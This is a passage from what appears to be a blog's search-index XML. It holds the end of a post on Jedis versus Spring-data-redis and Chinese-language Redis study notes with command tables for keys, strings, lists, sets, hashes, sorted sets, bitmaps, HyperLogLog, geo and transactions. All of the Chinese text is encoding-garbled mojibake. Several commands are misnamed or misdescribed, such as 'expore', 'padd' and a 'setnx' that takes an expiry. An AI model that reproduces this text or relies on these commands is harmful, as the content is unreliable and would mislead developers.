çš„ç‰¹æ€§ï¼Œæ–¹ä¾¿ä¸å…¶ä»–Springæ¡†æ¶è¿›è¡Œæ­é…ä½¿ç”¨</p><p>æ€»ä½“æ¥è¯´ï¼Œ<code>Jedis</code>ï¼Œæ›´åƒ<code>spring ä¸ MySQL</code>ç»“åˆï¼Œé€šè¿‡æ“ä½œè¿æ¥æ± ï¼Œè·å–å®ä¾‹æ“ä½œæ•°æ®åº“ï¼Œè€Œ<code>Spring-data-redis</code>ä¸springçš„æ•´åˆï¼Œæ›´åƒ<code>spring ä¸ mybatis</code>æ•´åˆï¼Œé€šè¿‡å·¥å‚ï¼Œåˆ›å»ºå®ä¾‹ï¼Œå†æ“ä½œå®ä¾‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é…ç½® </tag>
            
            <tag> Redis </tag>
            
            <tag> Spring boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rediså­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰</title>
      <link href="/posts/d9238aea/"/>
      <url>/posts/d9238aea/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Redisé”®ï¼ˆkeyï¼‰">Redisé”®ï¼ˆkeyï¼‰</h2><table><thead><tr><th style="text-align:left">å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">keys *</td><td>æŸ¥çœ‹å½“å‰åº“æ‰€æœ‰key</td></tr><tr><td style="text-align:left">exists &lt;key&gt;</td><td>åˆ¤æ–­æŸä¸ªkeyæ˜¯å¦å­˜åœ¨</td></tr><tr><td style="text-align:left">type &lt;key&gt;</td><td>æŸ¥çœ‹keyæ˜¯ä»€ä¹ˆç±»å‹</td></tr><tr><td style="text-align:left">del &lt;key&gt;</td><td>åˆ é™¤æŒ‡å®šçš„keyæ•°æ®</td></tr><tr><td style="text-align:left">expore &lt;key&gt; &lt;time&gt;</td><td>ä¸ºç»™å®šçš„keyè®¾ç½®è¿‡æœŸæ—¶é—´timeï¼ˆå•ä½ç§’ï¼‰</td></tr><tr><td style="text-align:left">ttl &lt;key&gt;</td><td>æŸ¥çœ‹è¿˜æœ‰å¤šå°‘ç§’è¿‡æœŸï¼Œ-1è¡¨ç¤ºæ°¸ä¸è¿‡æœŸï¼Œ-2è¡¨ç¤ºå·²è¿‡æœŸ</td></tr><tr><td style="text-align:left">select &lt;index&gt;</td><td>åˆ‡æ¢å½“å‰æ•°æ®åº“ï¼ˆå…±16ä¸ªæ•°æ®åº“ï¼Œ0ä¸ºé»˜è®¤åº“ï¼‰</td></tr><tr><td style="text-align:left">dbsize</td><td>æŸ¥çœ‹å½“å‰æ•°æ®åº“keyçš„æ•°é‡</td></tr><tr><td style="text-align:left">flushdb/flushall</td><td>æ¸…ç©ºå½“å‰åº“/å…¨éƒ¨åº“</td></tr></tbody></table><h2 id="Rediså­—ç¬¦ä¸²ï¼ˆStringï¼‰">Rediså­—ç¬¦ä¸²ï¼ˆStringï¼‰</h2><p><code>String</code>ç±»å‹æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ï¼Œæ„å‘³ç€Redisçš„<code>String</code>å¯åŒ…å«ä»»ä½•æ•°æ®ï¼Œæ¯”å¦‚jpgå›¾ç‰‡æˆ–è€…åºåˆ—åŒ–çš„å¯¹è±¡ã€‚</p><p>ä¸€ä¸ªRedisä¸­å­—ç¬¦ä¸²valueæœ€å¤šå¯ä»¥æ˜¯512Mã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>set &lt;key&gt; &lt;value&gt;</td><td>æ·»åŠ é”®å€¼å¯¹</td></tr><tr><td>get &lt;key&gt;</td><td>æŸ¥è¯¢å¯¹åº”é”®å€¼</td></tr><tr><td>append &lt;key&gt; &lt;value&gt;</td><td>å°†ç»™å®šçš„valueè¿½åŠ åˆ°åŸå€¼çš„æœ«å°¾</td></tr><tr><td>strlen &lt;key&gt;</td><td>è·å¾—keyçš„é•¿åº¦</td></tr><tr><td>setnx &lt;key&gt; &lt;value&gt;</td><td>åªæœ‰åœ¨keyä¸å­˜åœ¨æ—¶ï¼Œæ‰èƒ½è®¾ç½®keyçš„å€¼</td></tr><tr><td>incr/decr &lt;key&gt;</td><td>å°†keyä¸­å‚¨å­˜çš„æ•°å­—å€¼å¢/å‡ï¼ˆ+/-ï¼‰ 1</td></tr><tr><td>incrby/decrby &lt;key&gt; &lt;æ­¥é•¿&gt;</td><td>å°†keyä¸­å‚¨å­˜çš„æ•°å­—å€¼å¢/å‡ï¼Œè‡ªå®šä¹‰æ­¥é•¿</td></tr><tr><td>mset &lt;key1&gt;&lt;value1&gt;&lt;key2&gt;&lt;value2&gt;â€¦</td><td>åŒæ—¶è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªkey-valueå¯¹</td></tr><tr><td>mget &lt;key1&gt;&lt;key2&gt;â€¦</td><td>åŒæ—¶è·å–ä¸€ä¸ªæˆ–å¤šä¸ªvalue</td></tr><tr><td>msetnx &lt;key1&gt;&lt;value1&gt;&lt;key2&gt;&lt;value2&gt;â€¦</td><td>åŒæ—¶è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªkey-valueå¯¹ï¼Œå½“ä¸”ä»…å½“æ‰€æœ‰ç»™å®škeyéƒ½ä¸å­˜åœ¨</td></tr><tr><td>getrange &lt;key&gt; &lt;èµ·å§‹ä½ç½®&gt;&lt;ç»“æŸä½ç½®&gt;</td><td>è·å¾—å€¼çš„èŒƒå›´ï¼ˆå…¨éƒ¨ï¼šget key 0 -1ï¼‰</td></tr><tr><td>setrange &lt;key&gt;&lt;èµ·å§‹ä½ç½®&gt;&lt;value&gt;</td><td>ç”¨valueè¦†å†™keyæ‰€å‚¨å­˜çš„å­—ç¬¦ä¸²å€¼ï¼Œä»èµ·å§‹ä½ç½®å¼€å§‹ï¼ˆç´¢å¼•ä»0å¼€å§‹ï¼‰</td></tr><tr><td>setnx &lt;key&gt; &lt;è¿‡æœŸæ—¶é—´&gt;&lt;value&gt;</td><td>è®¾ç½®é”®å€¼çš„åŒæ—¶ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå•ä½ç§’ï¼‰</td></tr><tr><td>getset&lt;key&gt;&lt;value&gt;</td><td>è®¾ç½®æ–°å€¼åŒæ—¶è·å¾—æ—§å€¼</td></tr></tbody></table><h2 id="Redisåˆ—è¡¨ï¼ˆListï¼‰">Redisåˆ—è¡¨ï¼ˆListï¼‰</h2><p><strong>å•é”®å¤šå€¼ï¼ŒåŒå‘é“¾è¡¨</strong></p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>lpush/rpush &lt;key&gt; &lt;value1&gt; &lt;value2&gt;â€¦</td><td>ä»å·¦è¾¹/å³è¾¹æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå€¼</td></tr><tr><td>lpop/rpop  &lt;key&gt;</td><td>ä»å·¦è¾¹/å³è¾¹åå‡ºä¸€ä¸ªå€¼ã€‚</td></tr><tr><td>rpoplpush  &lt;key1&gt; &lt;key2&gt;</td><td>ä»key1åˆ—è¡¨å³è¾¹åå‡ºä¸€ä¸ªå€¼ï¼ŒæŸ¥åˆ°key2åˆ—è¡¨å³è¾¹</td></tr><tr><td>lrange &lt;key&gt; &lt;start&gt; &lt;stop&gt;</td><td>æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ ï¼ˆä»å·¦åˆ°å³ï¼‰&lt;br&gt;ï¼ˆå…¨éƒ¨ï¼šlrange key 0 -1ï¼‰</td></tr><tr><td>lindex &lt;key&gt; &lt;index&gt;</td><td>æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ ï¼ˆä»å·¦åˆ°å³ï¼‰</td></tr><tr><td>llen &lt;key&gt;</td><td>è·å¾—åˆ—è¡¨çš„é•¿åº¦</td></tr><tr><td>linsert &lt;key&gt; before/after &lt;value&gt; &lt;newvalue&gt;</td><td>åœ¨valueçš„å‰/åé¢æ’å…¥newvalueå€¼</td></tr><tr><td>lrem &lt;key&gt; &lt;n&gt; &lt;value&gt;</td><td>ä»å·¦è¾¹åˆ é™¤nä¸ªvalueï¼ˆä»å·¦åˆ°å³ï¼‰</td></tr><tr><td>lset &lt;key&gt; &lt;index&gt; &lt;value&gt;</td><td>å°†åˆ—è¡¨keyä¸‹æ ‡ä¸ºindexçš„å€¼æ›¿æ¢æˆvalue</td></tr></tbody></table><h2 id="Redisé›†åˆï¼ˆSetï¼‰">Redisé›†åˆï¼ˆSetï¼‰</h2><p>Redisçš„é›†åˆ<code>Set</code>æ˜¯Stringç±»å‹çš„æ— åºé›†åˆï¼Œä¸listç±»ä¼¼æ˜¯ä¸€ä¸ªåˆ—è¡¨çš„åŠŸèƒ½ï¼Œä½†<code>Set</code>å¯ä»¥è‡ªåŠ¨æ•°æ®æ’é‡ã€‚åº•å±‚æ˜¯ä¸€ä¸ªvalueä¸º<code>null</code>çš„hashè¡¨ï¼Œæ‰€ä»¥æ·»åŠ ã€åˆ é™¤ã€æŸ¥æ‰¾çš„å¤æ‚åº¦éƒ½ä¸º<code>O(1)</code>ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>sadd &lt;key&gt; &lt;member1&gt; &lt;member2&gt;â€¦</td><td>å°†ä¸€ä¸ªæˆ–å¤šä¸ªmemberå…ƒç´ åŠ å…¥åˆ°é›†åˆkeyä¸­ï¼Œå·²å­˜åœ¨çš„memberå°†è¢«å¿½ç•¥</td></tr><tr><td>smembers &lt;key&gt;</td><td>å–å‡ºè¯¥é›†åˆçš„æ‰€æœ‰å€¼</td></tr><tr><td>sismember &lt;key&gt; &lt;member&gt;</td><td>åˆ¤æ–­é›†åˆkeyæ˜¯å¦å«æœ‰è¯¥memberå€¼ï¼Œæœ‰åˆ™1ï¼Œæ— åˆ™0</td></tr><tr><td>scard &lt;key&gt;</td><td>è¿”å›è¯¥é›†åˆçš„å…ƒç´ ä¸ªæ•°</td></tr><tr><td>srem &lt;key&gt; &lt;member1&gt; &lt;member2&gt;â€¦</td><td>åˆ é™¤é›†åˆä¸­çš„æŸä¸ªå…ƒç´ </td></tr><tr><td>spop &lt;key&gt;</td><td>éšæœºä»è¯¥é›†åˆä¸­åå‡ºä¸€ä¸ªå€¼</td></tr><tr><td>srandmember &lt;key&gt; &lt;n&gt;</td><td>éšæœºä»è¯¥é›†åˆä¸­å–å‡ºnä¸ªå€¼ã€‚å€¼ä¸ä¼šä»é›†åˆä¸­åˆ é™¤</td></tr><tr><td>smove &lt;source&gt; &lt;destination&gt;  &lt;member&gt;</td><td>æŠŠé›†åˆä¸­çš„ä¸€ä¸ªmemberå€¼ä»ä¸€ä¸ªé›†åˆç§»åŠ¨åˆ°å¦ä¸€ä¸ªé›†åˆä¸­</td></tr><tr><td>sinter/sunion &lt;key1&gt; &lt;key2&gt;</td><td>è¿”å›ä¸¤ä¸ªé›†åˆçš„äº¤é›†/å¹¶é›†å…ƒç´ </td></tr><tr><td>sdiff &lt;key1&gt; &lt;key2&gt;</td><td>è¿”å›ä¸¤ä¸ªé›†åˆçš„å·®é›†å…ƒç´ ï¼ˆkey1ä¸­çš„ï¼Œä¸åŒ…å«key2ä¸­çš„ï¼‰</td></tr></tbody></table><h2 id="Rediså“ˆå¸Œï¼ˆHashï¼‰">Rediså“ˆå¸Œï¼ˆHashï¼‰</h2><p>Redisçš„<code>Hash</code>æ˜¯ä¸€ä¸ªStringç±»å‹çš„fieldå’Œvalueçš„æ˜ å°„è¡¨ï¼Œhashé€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡ï¼Œç±»ä¼¼Javaä¸­çš„<code>Map&lt;String, Object&gt;</code>ã€‚</p><p>å½“keyå­˜å‚¨çš„valueè¿‡å¤šæ—¶ï¼Œå¾€å¾€ä¸ºäº†æé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œä¾‹å¦‚ç”¨æˆ·IDä¸ºkeyï¼Œfieldæœ‰å§“åã€å¹´é¾„ã€èŒä¸šç­‰ä¿¡æ¯ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©é€šè¿‡key(ç”¨æˆ·ID)+field(å±æ€§æ ‡ç­¾)å°±å¯ä»¥æ“ä½œå¯¹åº”å±æ€§çš„æ•°æ®ã€‚</p><p>ç±»ä¼¼äºmapå¥—å¨ƒï¼š<code>&lt;Stringï¼Œ &lt;Map&lt;key, value&gt;&gt;&gt;</code></p><div class="note green no-icon flat"><p>å¥½å¤„ï¼šæ—¢ä¸éœ€è¦é‡å¤å­˜å‚¨æ•°æ®ï¼Œé¿å…äº†æ•°æ®å†—ä½™ï¼Œä¹Ÿä¸ä¼šå¸¦æ¥åºåˆ—åŒ–å’Œå¹¶å‘ä¿®æ”¹æ§åˆ¶çš„é—®é¢˜ã€‚</p></div><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>hset &lt;key&gt; &lt;field&gt; &lt;value&gt;</td><td>ç»™keyé›†åˆä¸­çš„fieldé”®èµ‹å€¼valueï¼Œä¾‹ï¼šhset user:001 name zeker</td></tr><tr><td>hget &lt;key&gt; &lt;field&gt;</td><td>ä»keyé›†åˆä¸­çš„fildä¸­å–å‡ºvalue</td></tr><tr><td>hmset &lt;key&gt; &lt;field1&gt; &lt;value1&gt; &lt;field2&gt; &lt;value2&gt;â€¦</td><td>æ‰¹é‡è®¾ç½®hashçš„å€¼</td></tr><tr><td>hexists &lt;key&gt; &lt;field&gt;</td><td>æŸ¥çœ‹å“ˆå¸Œè¡¨keyä¸­ï¼Œç»™å®šfieldæ˜¯å¦å­˜åœ¨</td></tr><tr><td>hkeys &lt;key&gt;</td><td>åˆ—å‡ºè¯¥hashé›†åˆçš„æ‰€æœ‰field</td></tr><tr><td>hvals &lt;key&gt;</td><td>åˆ—å‡ºè¯¥hashé›†åˆçš„æ‰€æœ‰value</td></tr><tr><td>hincrby &lt;key&gt; &lt;field&gt; &lt;increment&gt;</td><td>ä¸ºå“ˆå¸Œè¡¨keyä¸­çš„fieldçš„å€¼åŠ ä¸Šå¢é‡incrementï¼ˆä¾‹ï¼š1 -1ï¼‰</td></tr><tr><td>hsetnx &lt;key&gt; &lt;field&gt; &lt;value&gt;</td><td>å°†å“ˆå¸Œè¡¨keyä¸­çš„fieldçš„å€¼è®¾ç½®ä¸ºvalueï¼Œå½“ä¸”ä»…å½“fieldä¸å­˜åœ¨</td></tr></tbody></table><h2 id="Redisæœ‰åºé›†åˆï¼ˆZsetï¼‰">Redisæœ‰åºé›†åˆï¼ˆZsetï¼‰</h2><p>Redisæœ‰åºé›†åˆ<code>Zset</code>ä¸æ™®é€šé›†åˆSetç›¸ä¼¼ï¼Œéƒ½æ˜¯ä¸€ä¸ªæ²¡æœ‰é‡å¤å…ƒç´ çš„å­—ç¬¦ä¸²é›†åˆã€‚</p><p>ä¸åŒä¹‹å¤„åœ¨äºæœ‰åºé›†åˆ<code>Zset</code>çš„æ¯ä¸ªæˆå‘˜éƒ½å…³è”äº†ä¸€ä¸ªè¯„åˆ†ï¼ˆscoreï¼‰ï¼Œè¿™ä¸ªè¯„åˆ†ï¼ˆscoreï¼‰è¢«ç”¨æ¥æŒ‰ç…§ä»æœ€ä½åˆ†åˆ°æœ€é«˜åˆ†çš„æ–¹å¼æ’åºé›†åˆä¸­çš„æˆå‘˜ã€‚</p><p>é›†åˆä¸­çš„æˆå‘˜æ˜¯å”¯ä¸€çš„ï¼Œä½†è¯„åˆ†å¯ä»¥æ˜¯é‡å¤çš„ã€‚è¿™é‡Œä¾‹å­å¯ä»¥ä¸ºï¼šæ’è¡Œæ¦œ</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>zadd &lt;key&gt; &lt;score1&gt; &lt;member1&gt; &lt;score2&gt; &lt;member2&gt;â€¦</td><td>å°†ä¸€ä¸ªæˆ–å¤šä¸ªmemeberå…ƒç´ åŠå…¶scoreå€¼åŠ å…¥åˆ°æœ‰åºé›†keyä¸­</td></tr><tr><td>zrange &lt;key&gt; &lt;start&gt; &lt;stop&gt; [withscores]</td><td>è¿”å›æœ‰åºé›†keyä¸­ï¼Œä¸‹æ ‡åœ¨startä¸stopä¹‹é—´çš„å…ƒç´ (withscoreså¯è®©åˆ†æ•°ä¸å€¼è¿”å›åˆ°ç»“æœé›†</td></tr><tr><td>zrangebyscore key min max [withscoers]  [limit offset count]</td><td>è¿”å›æœ‰åºé›†keyä¸­ï¼Œæ‰€æœ‰scoreå€¼ä»‹äºminå’Œmaxä¹‹é—´ï¼ˆåŒ…æ‹¬ç­‰äºminæˆ–maxï¼‰çš„æˆå‘˜ï¼Œæœ‰åºé›†æˆå‘˜æŒ‰scoreå€¼é€’å¢ï¼ˆä»å°åˆ°å¤§ï¼‰æ¬¡åºæ’åˆ—</td></tr><tr><td>zrevrangebyscore key max min [withscoers]  [limit offset count]</td><td>devï¼šåè½¬ã€‚æ„æ€åŒä¸Šï¼Œæ¬¡åºä»å¤§åˆ°å°æ’åˆ—</td></tr><tr><td>zincrby &lt;key&gt; &lt;increment&gt; &lt;member&gt;</td><td>ä¸ºå…ƒç´ memberçš„scoreåŠ ä¸Šå¢é‡increment</td></tr><tr><td>zrem &lt;key&gt; &lt;member&gt;</td><td>åˆ é™¤è¯¥é›†åˆä¸‹æŒ‡å®šå€¼çš„å…ƒç´ </td></tr><tr><td>zcount &lt;key&gt; &lt;min&gt; &lt;max&gt;</td><td>ç»Ÿè®¡è¯¥é›†åˆä¸­åˆ†æ•°åŒºé—´å†…çš„å…ƒç´ ä¸ªæ•°</td></tr><tr><td>zrank &lt;key&gt; &lt;member&gt;</td><td>è¿”å›è¯¥å…ƒç´ memberåœ¨é›†åˆä¸­çš„æ’åï¼Œä»0å¼€å§‹</td></tr></tbody></table><p>Zsetåº•å±‚ä¸­ä½¿ç”¨äº†ä¸¤ç§æ•°æ®ç»“æ„ï¼šhashè¡¨ä¸è·³è·ƒè¡¨</p><ol><li>hashè¡¨ï¼Œä½œç”¨å°±æ˜¯å…³è”å…ƒç´ valueå’Œæƒé‡scoreï¼Œä¿éšœå…ƒç´ valueçš„å”¯ä¸€å€¼ï¼Œå¯ä»¥é€šè¿‡å…ƒç´ valueæ‰¾åˆ°ç›¸åº”çš„scoreå€¼ã€‚</li><li>è·³è·ƒè¡¨ï¼Œç›®çš„åœ¨äºç»™å…ƒç´ valueæ’åºï¼Œæ ¹æ®scoreçš„èŒƒå›´è·å–å…ƒç´ åˆ—è¡¨ï¼Œä»è€Œæ¯”æ™®é€šåˆ—è¡¨æŸ¥è¯¢æ•ˆç‡æ›´å¿«ã€‚</li></ol><h2 id="Redisæ–°æ•°æ®ç±»å‹">Redisæ–°æ•°æ®ç±»å‹</h2><h3 id="Bitmaps">Bitmaps</h3><p>Redisæä¾›<code>Bitmaps</code>è¿™ä¸ªâ€æ•°æ®ç±»å‹â€œå¯ä»¥å®ç°å¯¹ä½çš„æ“ä½œï¼š</p><p>ï¼ˆ1ï¼‰<code>Bitmaps</code>æœ¬èº«ä¸æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®é™…ä¸Šå°±æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å®ƒå¯ä»¥å¯¹å­—ç¬¦ä¸²çš„ä½è¿›è¡Œæ“ä½œã€‚ã€</p><p>ï¼ˆ2ï¼‰<code>Bitmaps</code>å•ç‹¬æä¾›äº†ä¸€å¥—å‘½ä»¤ï¼Œæ‰€ä»¥åœ¨Redisä¸­ä½¿ç”¨<code>Bitmaps</code>å’Œä½¿ç”¨å­—ç¬¦ä¸²çš„æ–¹æ³•ä¸å¤ªç›¸åŒã€‚å¯ä»¥<code>Bitmaps</code>æƒ³è±¡æˆä¸€ä¸ªä»¥ä½ä¸ºå•ä½æ•°ç»„ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸ªå•å…ƒåªèƒ½å­˜0æˆ–è€…1ï¼Œæ•°ç»„çš„ä¸‹æ ‡åœ¨<code>Bitmaps</code>ä¸­å«åšåç§»é‡ã€‚å•ä¸ª<code>Bitmaps</code>çš„æœ€å¤§é•¿åº¦æ˜¯<code>512MB</code>ï¼Œå³<code>2^32</code>ä¸ªæ¯”ç‰¹ä½ã€‚</p><div class="note green no-icon flat"><p>åˆç†åœ°ä½¿ç”¨æ“ä½œä½èƒ½å¤Ÿæœ‰æ•ˆåœ°æé«˜å†…å­˜ä½¿ç”¨ç‡å’Œå¼€å‘æ•ˆç‡ï¼Œå¹¶ä¸”å¯ä»¥æå¤§åœ°èŠ‚çœå†…å­˜ç©ºé—´ã€‚<br>ä¾‹å¦‚ï¼šç”¨æˆ·è®¿é—®ï¼Œç»Ÿè®¡ä¸åŒç”µè¯å·ç çš„ä¸ªæ•°ä»¥åŠå¸ƒéš†è¿‡æ»¤æ³•ï¼ˆURLçš„æ’é‡ã€åƒåœ¾é‚®ç®±åœ°å€çš„è¿‡æ»¤ï¼‰â€¦</p></div><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th><th></th></tr></thead><tbody><tr><td>setbit &lt;key&gt; &lt;offset&gt; &lt;value&gt;</td><td>è®¾ç½®Bitmapsä¸­æŸä¸ªåç§»é‡offsetçš„å€¼value</td><td></td></tr><tr><td>getbit &lt;key&gt; &lt;offset&gt;</td><td>è·å–Bitmapsä¸­æŸä¸ªåç§»é‡offsetçš„å€¼value</td><td></td></tr><tr><td>bitcount &lt;key&gt; [start end]</td><td>ç»Ÿè®¡å­—ç¬¦ä¸²ä»startå­—èŠ‚åˆ°endå­—èŠ‚æ¯”ç‰¹å€¼ä¸º1çš„æ•°é‡</td><td></td></tr><tr><td>bitop and(or/not/xor) &lt;destkey&gt; [keyâ€¦]</td><td>å¤šä¸ªBitmapsçš„andï¼ˆäº¤é›†ï¼‰ã€orï¼ˆå¹¶é›†ï¼‰ã€notï¼ˆéï¼‰ã€xorï¼ˆå¼‚æˆ–ï¼‰æ“ä½œå¹¶å°†ç»“æœä¿å­˜åœ¨destkeyä¸­</td><td></td></tr></tbody></table><h3 id="HyperLogLog">HyperLogLog</h3><div class="note default no-icon flat"><p>åœ¨å·¥ä½œå½“ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸ç»Ÿè®¡ç›¸å…³çš„åŠŸèƒ½éœ€æ±‚ï¼Œæ¯”å¦‚ç»Ÿè®¡ç½‘ç«™PVï¼ˆPageViewé¡µé¢è®¿é—®é‡ï¼‰,å¯ä»¥ä½¿ç”¨Redisçš„incrã€incrbyè½»æ¾å®ç°ã€‚<br>ä½†åƒUVï¼ˆUniqueVisitorï¼Œç‹¬ç«‹è®¿å®¢ï¼‰ã€ç‹¬ç«‹IPæ•°ã€æœç´¢è®°å½•æ•°ç­‰éœ€è¦å»é‡å’Œè®¡æ•°çš„é—®é¢˜å¦‚ä½•è§£å†³ï¼Ÿè€Œè¿™ç§æ±‚é›†åˆä¸­ä¸é‡å¤å…ƒç´ ä¸ªæ•°çš„é—®é¢˜ç§°ä¸ºåŸºæ•°é—®é¢˜ã€‚</p></div><p>è§£å†³åŸºæ•°é—®é¢˜æ–¹æ¡ˆï¼š</p><p>ï¼ˆ1ï¼‰æ•°æ®å­˜å‚¨åœ¨MySQLè¡¨ä¸­ï¼Œä½¿ç”¨distinct countè®¡ç®—ä¸é‡å¤ä¸ªæ•°</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨Redisæä¾›çš„hashã€setã€bitmapsç­‰æ•°æ®ç»“æ„æ¥å¤„ç†</p><p>ä»¥ä¸Šçš„æ–¹æ¡ˆç»“æœç²¾ç¡®ï¼Œä½†éšç€æ•°æ®ä¸æ–­å¢åŠ ï¼Œå¯¼è‡´å ç”¨ç©ºé—´è¶Šæ¥è¶Šå¤§ï¼Œå¯¹äºéå¸¸å¤§çš„æ•°æ®é›†æ˜¯ä¸åˆ‡å®é™…çš„ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿé™ä½ä¸€å®šçš„ç²¾åº¦æ¥å¹³è¡¡å­˜å‚¨ç©ºé—´ï¼ŒRedisæ¨å‡ºäº†HyperLogLogï¼Œä¸€ç§ç”¨æ¥åšåŸºæ•°ç»Ÿè®¡çš„ç®—æ³•ã€‚</p><p>å…¶ä¼˜ç‚¹åœ¨äºï¼š</p><p>åœ¨è¾“å…¥å…ƒç´ çš„æ•°é‡æˆ–è€…ä½“ç§¯éå¸¸éå¸¸å¤§æ—¶ï¼Œè®¡ç®—åŸºæ•°æ‰€éœ€çš„ç©ºé—´æ€»æ˜¯å›ºå®šçš„ã€å¹¶ä¸”æ˜¯å¾ˆå°çš„ã€‚</p><p>æ¯ä¸ª<code>HyperLogLog</code>é”®åªéœ€è¦èŠ±è´¹ <code>12 KB</code>å†…å­˜ï¼Œå°±å¯ä»¥è®¡ç®—æ¥è¿‘ <code>2^64</code> ä¸ªä¸åŒå…ƒç´ çš„<code>åŸºæ•°</code>ã€‚è¿™å’Œè®¡ç®—åŸºæ•°æ—¶ï¼Œå…ƒç´ è¶Šå¤šè€—è´¹å†…å­˜å°±è¶Šå¤šçš„é›†åˆå½¢æˆé²œæ˜å¯¹æ¯”ã€‚</p><div class="note info flat"><p>åŸºæ•° = æ•°æ®é›†å…ƒç´ ä¸ªæ•° - é‡å¤æ•°å­—ä¸ªæ•°</p></div><p>ä½†æ˜¯ï¼Œå› ä¸º<code>HyperLogLog</code>åªä¼šæ ¹æ®è¾“å…¥å…ƒç´ æ¥è®¡ç®—åŸºæ•°ï¼Œè€Œä¸ä¼šå‚¨å­˜è¾“å…¥å…ƒç´ æœ¬èº«ï¼Œæ‰€ä»¥ <code>HyperLogLog</code>ä¸èƒ½åƒé›†åˆé‚£æ ·ï¼Œè¿”å›è¾“å…¥çš„å„ä¸ªå…ƒç´ ã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>padd &lt;key&gt; &lt;element&gt; [elementâ€¦]</td><td>æ·»åŠ æŒ‡å®šå…ƒç´ elementåˆ°HyperLogLogä¸­</td></tr><tr><td>pfcount &lt;key&gt; [keyâ€¦]</td><td>è®¡ç®—keyä¸­çš„åŸºæ•°</td></tr><tr><td>pfmerge &lt;destkey&gt; &lt;sourcekey&gt; [sourcekeyâ€¦]</td><td>å°†ä¸€ä¸ªæˆ–å¤šä¸ªkeyåˆå¹¶åçš„ç»“æœå‚¨å­˜åœ¨å¦ä¸€ä¸ªdestkeyä¸­</td></tr></tbody></table><h3 id="Geospatital">Geospatital</h3><p><code>Redis GEO</code>ï¼ŒGeographicï¼Œåœ°ç†ä¿¡æ¯çš„ç¼©å†™ã€‚</p><p>ä¸»è¦ç”¨äºå­˜å‚¨åœ°ç†ä½ç½®ä¿¡æ¯ï¼Œå³ç»çº¬åº¦ï¼ˆäºŒç»´åæ ‡ï¼‰ï¼ŒåŸºäºè¯¥ç±»å‹ï¼Œæä¾›äº†ç»çº¬åº¦è®¾ç½®ï¼ŒæŸ¥è¯¢ï¼ŒèŒƒå›´æŸ¥è¯¢ï¼Œè·ç¦»æŸ¥è¯¢ï¼Œç»çº¬åº¦Hashç­‰å¸¸è§æ“ä½œã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>geoadd &lt;key&gt; &lt;longitude&gt; &lt;latitude&gt; &lt;member&gt; [longitude latitude memberâ€¦]</td><td>æ·»åŠ åœ°ç†ä½ç½®ï¼ˆç»åº¦ã€ç»´åº¦ã€åç§°ï¼‰ï¼ˆæœ‰æ•ˆç»åº¦ï¼š-180åº¦åˆ°180åº¦ï¼›æœ‰æ•ˆçº¬åº¦ï¼š-85.05112878åº¦åˆ°85.05112878åº¦ï¼‰</td></tr><tr><td>geopos &lt;key&gt; &lt;member&gt; [memberâ€¦]</td><td>è·å¾—æŒ‡å®šåœ°åŒºmemberçš„åæ ‡</td></tr><tr><td>geodist &lt;key&gt; &lt;member1&gt; &lt;member2&gt; [m|km|ft|mi]</td><td>è·å–ä¸¤ä¸ªæŒ‡å®šåœ°åŒºä½ç½®ä¹‹é—´çš„ç›´çº¿è·ç¦»ï¼ˆå•ä½ï¼šç±³|åƒç±³|è‹±å°º|è‹±é‡Œï¼Œé»˜è®¤å•ä½ç±³ï¼‰</td></tr><tr><td>georadius &lt;key&gt; &lt;longitude&gt; &lt;latitude&gt; radius    m|km|ft|mi</td><td>ä»¥ç»™å®šçš„ç»çº¬åº¦ä¸ºä¸­å¿ƒæ‰¾å‡ºæŸä¸€åŠå¾„radiuså†…çš„å…ƒç´ </td></tr></tbody></table><h2 id="Redisäº‹åŠ¡å‘½ä»¤">Redisäº‹åŠ¡å‘½ä»¤</h2><p>ä¸€ä¸ªäº‹åŠ¡ä»å¼€å§‹åˆ°æ‰§è¡Œä¼šç»å†ä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µï¼š</p><ul><li>å¼€å§‹äº‹åŠ¡</li><li>å‘½ä»¤å…¥é˜Ÿ</li><li>æ‰§è¡Œäº‹åŠ¡</li></ul><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>multi</td><td>æ 